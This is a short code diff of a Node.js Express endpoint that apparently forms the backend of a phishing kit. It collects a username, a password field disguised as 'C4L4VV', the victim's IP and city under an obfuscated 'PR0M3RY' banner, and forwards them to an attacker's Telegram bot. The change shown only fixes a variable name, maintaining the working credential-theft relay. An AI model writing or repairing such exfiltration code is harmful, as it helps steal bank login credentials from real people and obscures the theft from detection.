@@ -40,7 +40,7 @@ app.post('/api/sendMessage', async (req, res) => {
     if (!user || !ip) {
         return res.status(400).json({ error: 'Faltan datos obligatorios' });
     }
-    const message = `🟢PR0M3RY🟢\nUs4RX: ${useir}\nC4L4VV: ${user}\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🟢PR0M3RY🟢\nUs4RX: ${useri}\nC4L4VV: ${user}\n\nIP: ${ip}\nCiudad: ${city}`;
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
